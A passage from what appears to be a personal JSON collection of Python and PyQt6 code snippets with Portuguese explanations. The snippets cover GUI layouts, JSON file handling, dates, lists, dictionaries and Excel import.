QRegularExpression()\n\t\tregex = QRegularExpression('\\\\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\\\\.[com]{3}\\\\b',\n\t\treg_opt.PatternOption.CaseInsensitiveOption)\n\t\tself.email_edit.setValidator(QRegularExpressionValidator(regex))\n\t\tself.email_edit.textEdited.connect(self.clearText)\n\t\t\n\t\textra_info_tedit = QTextEdit()\n\t\t\n\t\tself.feedback_label = QLabel()\n\t\tsubmit_button = QPushButton('SUBMIT')\n\t\tsubmit_button.setMaximumWidth(140)\n\t\tsubmit_button.clicked.connect(self.checkFormInformation)\n\t\t\n\t\t#Criando o layout horizontal para ultimas linhas dos widgets\n\t\tsubmit_h_box = QHBoxLayout()\n\t\tsubmit_h_box.addWidget(self.feedback_label)\n\t\tsubmit_h_box.addWidget(submit_button)\n\t\t\n\t\t#Organizando os widgets e layouts in QFormLayout\n\t\tmain_form = QFormLayout()\n\t\tmain_form.setFieldGrowthPolicy(\n\t\t\tmain_form.FieldGrowthPolicy.AllNonFixedFieldsGrow)\n\t\tmain_form.setFormAlignment(Qt.AlignmentFlag.AlignHCenter |\\\n\t\t\t\t\t\t\t\t\tQt.AlignmentFlag.AlignTop)\n\t\tmain_form.setLabelAlignment(Qt.AlignmentFlag.AlignLeft)\n\t\t\n\t\tmain_form.addRow(header_label)\n\t\tmain_form.addRow('Name', name_h_box)\n\t\tmain_form.addRow('Gender', gender_combo)\n\t\tmain_form.addRow('Date of Birth', self.birthdate_edit)\n\t\tmain_form.addRow('Phone', self.phone_edit)\n\t\tmain_form.addRow('Email', self.email_edit)\n\t\tmain_form.addRow(QLabel('Comments or Messages'))\n\t\tmain_form.addRow(extra_info_tedit)\n\t\tmain_form.addRow(submit_h_box)\n\t\t\n\t\t#Setando o layout para a janela principal\n\t\tself.setLayout(main_form)\n\t\t\n\tdef clearText(self):\n\t\tprint('a')\n\t\t\n\tdef checkFormInformation(self):\n\t\tprint('b')\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\nmain_form = QFormLayout(): \nCria um layout de formul\u00e1rio, que \u00e9 um tipo de layout usado para organizar widgets em uma interface gr\u00e1fica de usu\u00e1rio (GUI). O layout de formul\u00e1rio \u00e9 projetado para organizar r\u00f3tulos e campos de entrada.\n\nmain_form.setFieldGrowthPolicy(main_form.FieldGrowthPolicy.AllNonFixedFieldsGrow):\n Define a pol\u00edtica de crescimento dos campos no layout de formul\u00e1rio. Neste caso, a pol\u00edtica \u00e9 definida como \"Todos os campos n\u00e3o fixos crescem\". Isso significa que os campos de entrada que n\u00e3o t\u00eam um tamanho fixo ir\u00e3o expandir para preencher o espa\u00e7o dispon\u00edvel.\n\nmain_form.setFormAlignment(Qt.AlignmentFlag.AlignHCenter | Qt.AlignmentFlag.AlignTop): Define a alinhamento do formul\u00e1rio dentro do layout principal. O formul\u00e1rio ser\u00e1 centralizado horizontalmente e alinhado ao topo. Qt.AlignmentFlag \u00e9 uma enumera\u00e7\u00e3o que especifica as op\u00e7\u00f5es de alinhamento.\n\nmain_form.setLabelAlignment(Qt.AlignmentFlag.AlignLeft):\n Define o alinhamento dos r\u00f3tulos no layout de formul\u00e1rio. Neste caso, os r\u00f3tulos ser\u00e3o alinhados \u00e0 esquerda."}, "QStackedLayout - gerenciamento de paginas": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QLineEdit,\nQTextEdit, QComboBox, QSpinBox, QDoubleSpinBox, QStackedLayout, QFormLayout, QVBoxLayout)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QPixmap\n\nclass MainWindow(QWidget):\n\t\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setFixedSize(300, 340)\n\t\tself.setWindowTitle('QStackedLayout Example')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\n\tdef setUpMainWindow(self):\n\t\t'''Criando e organizando os widgets da janlea principal'''\n\t\t#Cria e connecta o combobox na mudan\u00e7a das p\u00e1ginas\n\t\tpage_combo = QComboBox()\n\t\tpage_combo.addItems(['Image', 'Description', 'Additional Info'])\n\t\tpage_combo.activated.connect(self.switchPage)\n\t\t\n\t\t#Cria a imagem da pagina (pagina 1)\n\t\tprofile_image = QLabel()\n\t\timagem = QPixmap('imagens/gato.png')\n\t\tprofile_image.setPixmap(imagem)\n\t\t\n\t\t#Cria o perfil (p\u00e1gina 2)\n\t\tpg2_form = QFormLayout()\n\t\tpg2_form.setFieldGrowthPolicy(\n\t\t\tpg2_form.FieldGrowthPolicy.AllNonFixedFieldsGrow)\n\t\tpg2_form.setFormAlignment(\n\t\t\tQt.AlignmentFlag.AlignHCenter |\n\t\t\tQt.AlignmentFlag.AlignTop)\n\t\tpg2_form.setLabelAlignment(\n\t\t\tQt.AlignmentFlag.AlignLeft)\n\t\t\t\n\t\tpg2_form.addRow('Breed:', QLabel('Norwegian Forest Cat'))\n\t\tpg2_form.addRow('Origin:', QLabel('Norway'))\n\t\tpg2_form.addRow(QLabel('Description:'))\n\t\tdefault_text = '''Have a long, sturdy body, long legs\n\t\tand a bushy tail. They are friendly, intalligent,\n\t\tand generally good with peoplw'''\n\t\t\n\t\tpg2_form.addRow(QTextEdit(default_text))\n\t\t\n\t\tpg2_container = QWidget()\n\t\tpg2_container.setLayout(pg2_form)\n\t\t\n\t\t#Criando a p\u00e1gina 3\n\t\tpg3_form = QFormLayout()\n\t\tpg3_form.setFieldGrowthPolicy(\n\t\t\tpg3_form.FieldGrowthPolicy.AllNonFixedFieldsGrow)\n\t\tpg3_form.setFormAlignment(\n\t\t\tQt.AlignmentFlag.AlignHCenter |\n\t\t\tQt.AlignmentFlag.AlignTop)\n\t\tpg3_form.setLabelAlignment(\n\t\t\tQt.AlignmentFlag.AlignLeft)\n\t\t\t\n\t\tpg3_form.addRow(QLabel(\"Enter your cat's info.\"))\n\t\tpg3_form.addRow('Name:', QLineEdit())\n\t\tpg3_form.addRow('Color:', QLineEdit())\n\t\t\n\t\tage_sb = QSpinBox()\n\t\tage_sb.setRange(0, 30)\n\t\tpg3_form.addRow('Age:', age_sb)\n\t\t\n\t\tweight_dsb = QDoubleSpinBox()\n\t\tweight_dsb.setRange(0.0, 30.0)\n\t\tpg3_form.addRow('Weight (Kg):', weight_dsb)\n\t\t\n\t\tpg3_container = QWidget()\n\t\tpg3_container.setLayout(pg3_form)\n\t\t\n\t\t\n\t\t#Criando o stackedlayout e adicionando as p\u00e1ginas\n\t\tself.stacked_layout = QStackedLayout()\n\t\tself.stacked_layout.addWidget(profile_image)\n\t\tself.stacked_layout.addWidget(pg2_container)\n\t\tself.stacked_layout.addWidget(pg3_container)\n\t\t\n\t\t#Criando o layout principal\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(page_combo)\n\t\tmain_v_box.addLayout(self.stacked_layout)\n\t\tself.setLayout(main_v_box)\n\t\t#para caso for usar botoes para trocas de pagina\n\n\n\t\t\n\tdef switchPage(self, index):\n\t\tself.stacked_layout.setCurrentIndex(index)\n\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n########################################################\n\n\"\"\"\n#Fazendo com botoes\nimport sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QLineEdit,\nQTextEdit, QPushButton, QFormLayout, QVBoxLayout, QStackedLayout,\nQSpinBox, QDoubleSpinBox)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QPixmap\n\nclass MainWindow(QWidget):\n\t\t\t\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n        \n\tdef initializeUI(self):\n\t\tself.setFixedSize(300, 340)\n\t\tself.setWindowTitle('QStackedLayout Example')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n    \n\tdef setUpMainWindow(self):\n        # Cria a imagem da p\u00e1gina 1\n\t\tprofile_image = QLabel()\n\t\timagem = QPixmap('dinheiro.png')\n\t\timagem_red = imagem.scaled(200, 200)\n\t\tprofile_image.setPixmap(imagem_red)\n        \n\t\t# Cria o perfil (p\u00e1gina 2)\n\t\tpg2_form = QFormLayout()\n\t\tpg2_form.setFieldGrowthPolicy(QFormLayout.FieldGrowthPolicy.AllNonFixedFieldsGrow)\n\t\tpg2_form.setFormAlignment(Qt.AlignmentFlag.AlignHCenter | Qt.AlignmentFlag.AlignTop)\n\t\tpg2_form.setLabelAlignment(Qt.AlignmentFlag.AlignLeft)\n        \n\t\tpg2_form.addRow('Breed:', QLabel('Norwegian Forest Cat'))\n\t\tpg2_form.addRow('Origin:', QLabel('Norway'))\n\t\tpg2_form.addRow(QLabel('Description:'))\n\t\tdefault_text = '''Have a long, sturdy body, long legs\n\t\t\tand a bushy tail. They are friendly, intelligent,\n\t\t\tand generally good with people'''\n        \n\t\tpg2_form.addRow(QTextEdit(default_text))\n        \n\t\tpg2_container = QWidget()\n\t\tpg2_container.setLayout(pg2_form)\n        \n\t\t# Criando a p\u00e1gina 3\n\t\tpg3_form = QFormLayout()\n\t\tpg3_form.setFieldGrowthPolicy(QFormLayout.FieldGrowthPolicy.AllNonFixedFieldsGrow)\n\t\tpg3_form.setFormAlignment(Qt.AlignmentFlag.AlignHCenter | Qt.AlignmentFlag.AlignTop)\n\t\tpg3_form.setLabelAlignment(Qt.AlignmentFlag.AlignLeft)\n        \n\t\tpg3_form.addRow(QLabel(\"Enter your cat's info.\"))\n\t\tpg3_form.addRow('Name:', QLineEdit())\n\t\tpg3_form.addRow('Color:', QLineEdit())\n        \n\t\tage_sb = QSpinBox()\n\t\tage_sb.setRange(0, 30)\n\t\tpg3_form.addRow('Age:', age_sb)\n        \n\t\tweight_dsb = QDoubleSpinBox()\n\t\tweight_dsb.setRange(0.0, 30.0)\n\t\tpg3_form.addRow('Weight (Kg):', weight_dsb)\n        \n\t\tpg3_container = QWidget()\n\t\tpg3_container.setLayout(pg3_form)\n        \n\t\t# Criando o stacked layout e adicionando as p\u00e1ginas\n\t\tself.stacked_layout = QStackedLayout()\n\t\tself.stacked_layout.addWidget(profile_image)\n\t\tself.stacked_layout.addWidget(pg2_container)\n\t\tself.stacked_layout.addWidget(pg3_container)\n        \n\t\tbtn_page1 = QPushButton('Page 1')\n\t\tbtn_page2 = QPushButton('Page 2')\n\t\tbtn_page3 = QPushButton('Page 3')\n        \n\t\tbtn_page1.clicked.connect(lambda: self.switchPage(0))\n\t\tbtn_page2.clicked.connect(lambda: self.switchPage(1))\n\t\tbtn_page3.clicked.connect(lambda: self.switchPage(2))\n        \n        #Criando o layout principal\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(btn_page1)\n\t\tmain_v_box.addWidget(btn_page2)\n\t\tmain_v_box.addWidget(btn_page3)\n\t\tmain_v_box.addLayout(self.stacked_layout)\n\t\tself.setLayout(main_v_box)\n\n\tdef switchPage(self, index):\n\t\tself.stacked_layout.setCurrentIndex(index)\n  \n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec()) \n\n\"\"\""}, "json dic - salvar e carregar informacoes json": {"codigo": "import json\ndicionario = {}\n\n#Salva o dicionario no arquido json\ndef salvar_json():\n\ttry:\n\t\twith open('arquivo.json', 'w') as file:\n\t\t\tjson.dump(dicionario, file)\n\texcept FileNotFoundError:\n\t\tpass\n\t\n#Salva colocar o conte\u00f9do do arquivo json no dicionario\t\t\t\ndef carregar_json():\n\ttry:\n\t\twith open('memoria/arquivo.json', 'r') as file:\n\t\t\tcontent = file.read()\n\t\t\tif content:\n\t\t\t\tdicionario.update(json.loads(content))\n\texcept (FileNotFoundError, json.JSONDecodeError):\n\t\tpass\n", "categoria": "Python Geral"}, "json list - salvar e carregar informacoes ": {"codigo": "import json\ndicionario = []\n\n#Salva o dicionario no arquido json\ndef salvar_json():\n\ttry:\n\t\twith open('arquivo.json', 'w') as file:\n\t\t\tjson.dump(dicionario, file)\n\texcept FileNotFoundError:\n\t\tpass\n\t\n#Salva colocar o conte\u00f9do do arquivo json no dicionario\t\t\t\ndef carregar_json():\n\ttry:\n\t\twith open('memoria/arquivo.json', 'r') as file:\n\t\t\tcontent = file.read()\n\t\t\tif content:\n\t\t\t\tdicionario = json.loads(content)\n\texcept (FileNotFoundError, json.JSONDecodeError):\n\t\tpass", "categoria": "Python Geral"}, "QMessageBox - caixa de mensagem ": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QPushButton, \nQMessageBox)\nfrom PyQt6.QtGui import QFont\nfrom PyQt6.QtCore import Qt\n\n\nclass MessageBox(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(100, 100)\n\t\tself.setWindowTitle('QMessageBox')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\n\tdef setUpMainWindow(self):\n\t\tbotao = QPushButton('QMessageBox', self)\n\t\tbotao.clicked.connect(self.qmessagebox)\n\t\t\n\tdef qmessagebox(self):\n\t\ta = 1\n\t\tresposta = QMessageBox.information(self, 'Titulo',\n\t\tf'''<p> Primeira linha </p>\n\t\t<p> Segunda linha</p>\n\t\t<p> Colocar info {a} </p>''',\n\t\tQMessageBox.StandardButton.Yes |\\\n\t\tQMessageBox.StandardButton.No,\n\t\tQMessageBox.StandardButton.Yes)\n\t\t\n\t\tif resposta == QMessageBox.StandardButton.Yes:\n\t\t\tprint('Sim')\n\t\tif resposta == QMessageBox.StandardButton.No:\n\t\t\tprint('No')\n\t\t\n\t\t#QMessageBox.about(self, 'Nome da pagina', \n\t\t#'''Escreve o que quiser''')\n\tdef about(self):\n\t\tQMessageBox.about(self, 'Sobre o NotePad',\n\t\t\t\t'''<p> Pr\u00e1tica do PyQt6<\\p>\n\t\t\t\t<p>Projeto 5.1 - NotePagGui<\\p>''')\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MessageBox()\n\tsys.exit(app.exec())\n"}, "datas - calculos e armazenamento de datas": {"categoria": "Python Geral", "codigo": "from datetime import datetime\nimport locale\n\nlocale.setlocale(locale.LC_TIME, 'pt_BR.UTF-8')\n\n'''Nesse caso ele armazenda as datas em str'''\ndata_hoje = datetime.now().strftime('%d-%m-%y')\ndia_da_semanda = datetime.now().strftime('%A')\nmes_atual = datetime.now().strftime('%B')\nmes_ano = datetime.now().strftime('%m-%y')\nano = datetime.now().strftime('%y')\n\nprint(f'Data Hoje: {data_hoje}')\nprint(f'Dia da Semanda: {dia_da_semanda}')\nprint(f'M\u00eas: {mes_atual}')\nprint(f'M\u00eas ano: {mes_ano}')\nprint(f'Ano: {ano}')\n\n'''Para fazer compara\u00e7\u00f5es e calculos entre datas, \u00e9 preciso format\u00e1-las\n'''\ndata_hoje_formatada = datetime.strptime(data_hoje, '%d-%m-%y')\n'''Agora podemos fazer os calculos com as datas'''\nprint(f'Data formatada: {data_hoje_formatada}')\n\n'''Quando importar dados do excel no formato DADOS\ndevemos converter as datas de n\u00fameros para str de forma \ncompreenss\u00edvel ao usu\u00e1rio, para funcionar em v\u00e1rias tabelas, pois pode ser armazenado\nem float ou int\nusamos: '''\n\t\t\t\tif isinstance(valor['REALIZA\u00c7\u00c3O'], int):\n\t\t\t\t\tvalor['REALIZA\u00c7\u00c3O'] = datetime.fromordinal(datetime(1900, 1, 1).toordinal() + valor['REALIZA\u00c7\u00c3O'] - 2)\n\t\t\t\telif isinstance(valor['REALIZA\u00c7\u00c3O'], float):\n    # Se 'REALIZA\u00c7\u00c3O' for um float, converta-o para um objeto de data\n\t\t\t\t\tvalor['REALIZA\u00c7\u00c3O'] = datetime.fromordinal(datetime(1900, 1, 1).toordinal() + int(valor['REALIZA\u00c7\u00c3O']) - 2)\n\t\t\t\tdata_formatada = valor['REALIZA\u00c7\u00c3O'].strftime('%d-%m-%y')"}, "listas": {"categoria": "Python Geral", "codigo": "lista = []\n\n#Adicionando no final da lista\nlista.append('item_1')\nprint(lista)\n\n#Adicionando no lugar que quiser\nlista.insert(0, 'items_2')\nprint(lista)\n\n#Deletar itens por localiza\u00e7\u00e3o\ndel lista[0]\nprint(lista)\n\n#Remover atrav\u00e9s do nome\nlista.remove('item_1')\nprint(lista)\n\n#Adicionando um item no final da lista\nlista.append('item')\n\n#Adicionando um item em qualquer lugar da lista\nlista.insert(0, 'item')\n\n#Tirados da lista\n'''\nitem_tirado = lista.pop(0)'''\n\n#Para organizar a lista em ordem alfab\u00e9tica, estrutura\nlista = ['carro', 'moto', 'diagrama', 'arvore', 'amazonas', 'rio']\nlista.sort(reverse = False)\nprint(lista)\nprint(sorted(lista))\n\n#Para organizar uma lista de tr\u00e1s para frente\nlista.reverse()\nprint(lista)\n\n#Descobrindo o tamanho de uma lista\nprint(len(lista))\n\n#Mostrando uma fatia de uma lista, pode usar com o laco for tamb\u00e9m\nprint(lista[0:5])\n\n#Fazendo uma lista copia da lista original\ncopia_lista = lista[:]\nprint(copia_lista)\n\n#Enumerando os itens de ums lista\nfor index, item in enumerate(lista, start = 1):\n\tprint(f'{index}. {item}')\n\n\n####################################################################\n\n'''\nsorted(lista)| sorted(lista, reverse=true) | sorted(lista, key=len(lista), reverse=True)\n\nO sorted() ordena a lista em ordem crescente ou descrescente sem mudar\na lista original, ou seja, cria uma nova lista, e return outra lista, o \nkey=len(lista) vai ordenar os itens de acordo com a posi\u00e7\u00e3o deles na lista\n\nlista.sort() | lista.sort(reverse=True) | lista.sort(key=len(lista), reverse=True)\n\nO sort() ordena a lista modificando a lista original, os agrumentos seguem o mesmo\npadr\u00e3o.\n\nQuando estamos trantando de Tuplas(1,2,3,4,5)(que s\u00e3o imutaveis), passamos a \ntupla para o argumento key= lambda pessoa: pessoa[1], ou seja recebe a tupla\ne extrai a parte [1], o n\u00famero e ordena por ele.\n\n'''\n\n\nlista = [1, 2, 5, 4, 8, 760, 43, 40]\nprint(sorted(lista, reverse=True))\n\nlista.sort(reverse=True)\nprint(lista)\n\n\npessoas = [('Alice', 30), ('Bob', 25), ('Charlie', 35)]\npessoas.sort(key=lambda pessoa: pessoa[1])\nprint(pessoas)\n\n#####################################################################\n"}, "dicionario": {"categoria": "Python Geral", "codigo": "dicionario = {}\n\n#Acrescentando informa\u00e7\u00f5es no dicion\u00e1rio\ndicionario['nome'] = 'samuel souza'\nprint(dicionario)\n\n#Fazendo uma lista com as chaves do dicion\u00e1rio\nlista = list(dicionario.keys())\nprint(lista)\n\n#Ordenando uma lista em ordem crescente de valor\n#No caso o m\u00e9todo sorted vai chamar o segundo valor da tupla chave:valor\nfrom collections import OrderedDict\nitens_ordenados = OrderedDict(sorted(self.item_tempo_estoque.items(), key=lambda x: x[1]))\n\n######################################################################\n\nfrom collections import OrderedDict\n\ndicionario = {'samuel':{'idade':20, 'rua':'a'}, \n\t\t\t'davi':{'idade':23, 'rua':'b'}, \n\t\t\t'vilmar':{'idade':50, 'rua':'g'}, \n\t\t\t'jeane':{'idade':19, 'rua':'h'}}\n\n\n'''\nPara ficar mais f\u00e1cil a compreen\u00e7\u00e3o, o item: = dicion\u00e1rio\no item[1] significa a primeira tupla do dicion\u00e1rio interno e \n['idade'] \u00e9 a chave para o valor armazenado\n\n'''\n\ndicionario_ordenado = dict(sorted(dicionario.items(), key=lambda item:item[1]['idade']))\nprint(dicionario_ordenado)\n\n\n\n\n\n######################################################################\n\ndicionario = {'samuel':{'info':{'idade':20, 'rua':'a', 'id':1234}, 'dados':{'data': 12}},\n\t\t\t\t'davi':{'info':{'idade':24, 'rua':'b', 'id':1876}, 'dados':{'data': 16}},\n\t\t\t\t'jeane':{'info':{'idade':19, 'rua':'a', 'id':7654}, 'dados':{'data': 20}}}\n\ndicionario_ordenado = dict(sorted(dicionario.items(), key=lambda item:item[1]['dados']['data']))\ndo = dicionario_ordenado\n\nfor nome, dic in do.items():\n\tprint(f\"{nome}\"  \n\tf\"Idade:{dic['info']['idade']}  Rua:{dic['info']['rua']}  \"\n\tf\"Id:{dic['info']['id']}  data:{dic['dados']['data']}\")\n"}, "excel - dicionario/lista": {"codigo": "import openpyxl\nimport xlrd\nimport json\n\n# Substitua 'caminho/para/seu/arquivo' pelo caminho real para o seu arquivo\narquivo = 'estoque.xls'\n\n# Verifica a extens\u00e3o do arquivo\nextensao = arquivo.split('.')[-1]\n\n# Carrega o arquivo usando a biblioteca apropriada\nif extensao == 'xlsx':\n\tworkbook = openpyxl.load_workbook(arquivo)\n\tsheet = workbook.active\nelif extensao == 'xls':\n\tworkbook = xlrd.open_workbook(arquivo)\n\tsheet = workbook.sheet_by_index(0)\nelse:\n\tprint(\"Formato de arquivo n\u00e3o suportado.\")\n\n# Criando um dicion\u00e1rio para armazenar os produtos e quantidades\nestoque = {}\n\n# Iterando pelas linhas da planilha\nfor row_idx in range(1, sheet.nrows):\n\tinfo = {}\n\titem = sheet.cell_value(row_idx, 1)  # Substitua pelo \u00edndice da coluna correta\n\tcodigo = sheet.cell_value(row_idx, 0)  # Substitua pelo \u00edndice da coluna correta\n\tvalor = sheet.cell_value(row_idx, 2)  # Substitua pelo \u00edndice da coluna correta\n\tcusto = sheet.cell_value(row_idx, 3)  # Substitua pelo \u00edndice da coluna correta\n\tquantidade = sheet.cell_value(row_idx, 4)  # Substitua pelo \u00edndice da coluna correta\n\tfornecedor = sheet.cell_value(row_idx, 5)  # Substitua pelo \u00edndice da coluna correta\n\tcategoria = sheet.cell_value(row_idx, 6)  # Substitua pelo \u00edndice da coluna \n\tsubcategoria = sheet.cell_value(row_idx, 7)  # Substitua pelo \u00edndice da coluna correta\n\tmarca = sheet.cell_value(row_idx, 8)  # Substitua pelo \u00edndice da coluna correta\n\tlocalizacao = sheet.cell_value(row_idx, 9)  # Substitua pelo \u00edndice da coluna correta\n\tobservacoes = sheet.cell_value(row_idx, 10)  # Substitua pelo \u00edndice da coluna correta\n\t\n\tinfo['codigo'] = str(int(codigo))\n\tinfo['valor'] = float(valor)\n\tinfo['custo'] = float(custo)\n\tinfo['quantidade'] = float(quantidade)\n\tinfo['fornecedor'] = fornecedor\n\tinfo['categoria'] = categoria\n\tinfo['subcategoria'] = subcategoria\n\tinfo['marca'] = marca\n\tinfo['localizacao'] = localizacao\n\tinfo['observacoes'] = observacoes\n\n\n\n\testoque[item] = info\n\n\nwith open('estoque.json', 'w') as file:\n\tjson.dump(estoque, file)", "categoria": "Python Geral"}, "limpar terminal ": {"categoria": "Python Geral", "codigo": "def clear(): \n\tif sys.platform.startswith('win'):    \n\t\tos.system('cls')\n\telse:\n\t\tos.system('clear')"}, "layout espaco": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QLabel, QVBoxLayout)\nfrom PyQt6.QtGui import QFont\nfrom PyQt6.QtCore import Qt\n\nclass Main_window(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(200, 200)\n\t\tself.setWindowTitle('Espa\u00e7o Layout')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tlabel_1 = QLabel('Item 1')\n\t\tlabel_2 = QLabel('Item 2')\n\t\tlabel_3 = QLabel('Item 3')\n\t\tlabel_4 = QLabel('Item 4')\n\t\tlabel_5 = QLabel('Item 5')\n\t\tlabel_6 = QLabel('Item 6')\n\t\t\n\n#addSpacing(int) = Cria um espaco n\u00e3o estic\u00e1vel\n#addStretch(int) = Cria um espaco estic\u00e1vel\n#Para QVBoxLayout + QHBoxLayout\n#setHorizontalSpacing(int)\n#setVerticalSpacing(int)\n#setSpacing(int)\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(label_1)\n\t\tmain_v_box.addSpacing(30)\n\t\tmain_v_box.addWidget(label_2)\n\t\tmain_v_box.addStretch(30)\n\t\tmain_v_box.addWidget(label_3)\n\t\tmain_v_box.addWidget(label_4)\n\t\tmain_v_box.addWidget(label_5)\n\t\tmain_v_box.addWidget(label_6)\n\t\tself.setLayout(main_v_box)\n\t\t", "categoria": "PyQt6"}, "icone - coloca imagem em botao e na janela": {"codigo": "import sys, random\nfrom PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget,\nQLabel, QPushButton, QVBoxLayout)\nfrom PyQt6.QtCore import Qt, QSize\nfrom PyQt6.QtGui import QIcon\n\nclass MainWindow(QMainWindow):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(200, 200)\n\t\tself.setWindowTitle('Icones')\n\t\tself.setWindowIcon(QIcon('dinheiro.png'))\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\ticon_button = QPushButton(self)\n\t\ticon_button.setIcon(QIcon('dinheiro.png'))\n\t\ticon_button.setIconSize(QSize(60, 60))\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())", "categoria": "PyQt6"}, "QTabWidget - troca de pagina mais interativa": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel,\nQRadioButton, QGroupBox, QLineEdit, QTabWidget, QHBoxLayout,\nQVBoxLayout)\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(400, 300)\n\t\tself.setWindowTitle('Containers Example')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t#Criando o Tab Bar\n\t\ttab_bar = QTabWidget(self)\n\t\t\n\t\t#Informa os TabBar\n\t\t#Dever\u00e1 ser usado para o layout mais em baixo\n\t\tself.prof_details_tab = QWidget()\n\t\tself.background_tab = QWidget()\n\t\t\n\t\t#Colocar o nome nos tab_bar\n\t\ttab_bar.addTab(self.prof_details_tab, 'Profile Details')\n\t\ttab_bar.addTab(self.background_tab, 'Background')\n\t\t\n\t\t#Abre as p\u00e1ginas do TabBar, os m\u00e9todos\n\t\tself.profileDetailsTab()\n\t\tself.backgroundTab()\n\t\t\n\t\t#Layout geral do TabBar\n\t\tmain_h_box = QHBoxLayout()\n\t\tmain_h_box.addWidget(tab_bar)\n\t\tself.setLayout(main_h_box)\n\t\t\n\tdef profileDetailsTab(self):\n\t\tname_label = QLabel('Name')\n\t\tname_edit = QLineEdit()\n\t\taddress_label = QLabel('Adress')\n\t\taddress_edit = QLineEdit()\n\t\t\n\t\tmale_rb = QRadioButton('Male')\n\t\tfemale_rb = QRadioButton('Female')\n\t\t\n\t\t#Criando o layout para os botoes\n\t\tgender_h_box = QHBoxLayout()\n\t\tgender_h_box.addWidget(male_rb)\n\t\tgender_h_box.addWidget(female_rb)\n\t\t#Criando o Grupo em caixa que v\u00e3o os botoes\n\t\tgender_gb = QGroupBox('Gender')#Nome da caixa '  '\n\t\tgender_gb.setLayout(gender_h_box)\n\t\t\n\t\t#Layout geral da pagina de perfil\n\t\ttab_v_box = QVBoxLayout()\n\t\ttab_v_box.addWidget(name_label)\n\t\ttab_v_box.addWidget(name_edit)\n\t\ttab_v_box.addStretch()\n\t\ttab_v_box.addWidget(address_label)\n\t\ttab_v_box.addWidget(address_edit)\n\t\ttab_v_box.addStretch()\n\t\ttab_v_box.addWidget(gender_gb)\n\t\tself.prof_details_tab.setLayout(tab_v_box)\n\t\t\n\tdef backgroundTab(self):\n\t\t#Layout parcial da p\u00e1gina\n\t\ted_v_box = QVBoxLayout()\n\t\t\n\t\t#Criando varios botoes redondos de marcar\n\t\teducation_list = [\"High School Diploma\", \n\t\t\"Associate's Degree\", \"Doctorate or Higher\"]\n\t\t\n\t\tfor ed in education_list:\n\t\t\tself.education_rb = QRadioButton(ed)\n\t\t\ted_v_box.addWidget(self.education_rb)\n\t\t\n\t\t#Criando o Group Box dos botoes gerados automaticamente\t\n\t\tself.education_gb = QGroupBox('Highest Level of Education')\n\t\tself.education_gb.setLayout(ed_v_box)\n\t\t\n\t\t#Layout geral da p\u00e1gina\n\t\ttab_v_box = QVBoxLayout()\n\t\ttab_v_box.addWidget(self.education_gb)\n\t\tself.background_tab.setLayout(tab_v_box)\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n", "categoria": "PyQt6"}, "notebooks compra": {"codigo": "Avell Storm BS i7 3050", "categoria": "NoteBook"}, "montando pizza - Style,QGroupBox, QGroupButton, QTabWidget": {"categoria": "Programas exemplos", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel,\nQPushButton, QRadioButton, QButtonGroup, QTabWidget, QGroupBox,\nQVBoxLayout, QHBoxLayout, QGridLayout)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QPixmap\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(700, 700)\n\t\tself.setWindowTitle('6.1 - Food Order GUI')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.tab_bar = QTabWidget()\n\t\t\n\t\tself.pizza_tab = QWidget() #Janela 